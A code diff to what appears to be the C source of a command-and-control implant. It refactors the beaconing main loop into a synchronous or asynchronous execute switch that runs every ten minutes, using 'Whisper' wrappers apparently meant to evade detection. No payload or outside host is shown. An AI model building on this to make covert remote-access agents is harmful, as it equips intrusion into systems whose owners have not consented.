@@ -23,8 +23,9 @@ this? either at front or back.
 */
 
 // int execute();
-DWORD execute_async(char * agent_id);
+DWORD execute(char * agent_id);
 void generate_uuid4(char* agent_id);
+void execution_setup(char* agent_id);
 
 // ASYNC BEACON!!!
 /*
@@ -45,31 +46,85 @@ This is reflected in the command API call, and in the web gui.
 
 */
 
-int main()
-{
+// int main()
+// {
+//     DEBUG_LOG("STARTING");
+
+//     char agent_id[37];
+//     generate_uuid4(agent_id);
+
+
+//     while (1) {
+
+//         // Create thread
+//         HANDLE thread = WhisperCreateThread(NULL, 0, execute_async, agent_id, 0, NULL);
+//         if (thread) {
+//             CloseHandle(thread); // Let the thread clean itself up
+//         } else {
+//             DEBUG_LOG("Failed to create thread.\n");
+
+//         }
+//         // Sleep for X seconds before running the next loop, gets time from get_sleep_time()
+//         WhisperSleep(get_sleep_time());
+//     }
+// }
+
+int main() {
+
+
     DEBUG_LOG("STARTING");
 
     char agent_id[37];
     generate_uuid4(agent_id);
 
+    initialize_critical_sections();
+
+    // Example of setting the execution mode (you can do this at any point in your code)
+    set_execution_mode(EXEC_MODE_SYNC);  // Initially run synchronously
 
     while (1) {
+        execution_setup(agent_id); // Call the command execution function
 
-        // Create thread
-        HANDLE thread = WhisperCreateThread(NULL, 0, execute_async, agent_id, 0, NULL);
+        //WhisperSleep(get_sleep_time());
+        WhisperSleep(10 * 60);
+
+    }
+
+    return 0;
+}
+
+// Function to execute the command (switching logic)
+void execution_setup(char* agent_id) {
+    // ... command checking logic (when you implement it) ...
+
+    switch (g_execution_mode) {
+    case EXEC_MODE_ASYNC: {
+        DEBUG_LOG("ASYNC\n");
+
+        // Asynchronous execution (new thread)
+        HANDLE thread = WhisperCreateThread(NULL, 0, execute, agent_id, 0, NULL);
         if (thread) {
-            CloseHandle(thread); // Let the thread clean itself up
+            CloseHandle(thread); // Detach the thread
         } else {
             DEBUG_LOG("Failed to create thread.\n");
-
         }
-        // Sleep for X seconds before running the next loop, gets time from get_sleep_time()
-        WhisperSleep(get_sleep_time());
+        break;
+    }
+    case EXEC_MODE_SYNC: {
+        DEBUG_LOG("SYNC/INLINE\n");
+        execute(agent_id); // Call the function directly
+        break;
+    }
+    default:
+        DEBUG_LOG("Invalid execution mode.\n");
+        break;
     }
 }
 
-// Thread function for executing the command asynchronously
-DWORD WINAPI execute_async(char * agent_id)
+
+
+// Thread function for executing the command 
+DWORD WINAPI execute(char * agent_id)
 {
 
     //bug somewhere in here. yay
@@ -131,6 +186,9 @@ DWORD WINAPI execute_async(char * agent_id)
 
     return 0;
 }
+
+
+
 
 void generate_uuid4(char* uuid) {
     uint8_t bytes[16];
